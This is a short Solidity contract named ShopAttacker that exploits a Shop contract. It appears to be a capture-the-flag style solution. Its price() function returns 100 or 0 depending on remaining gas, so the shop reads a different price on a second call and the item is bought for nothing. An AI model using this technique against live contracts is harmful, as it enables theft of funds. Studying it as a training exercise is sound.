// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Shop.sol";

contract ShopAttacker {
    Shop public shop;
    uint256 public remainingGas = 10000;

    constructor(Shop _shop) public {
        shop = _shop;
    }

    function setRemainingGas(uint256 _remainingGas) external {
        remainingGas = _remainingGas;
    }

    function price() external view returns(uint256) {
        if (gasleft() >= remainingGas) {
            return 100;
        }

        return 0;
    }

    function buy() external {
        shop.buy();
    }
}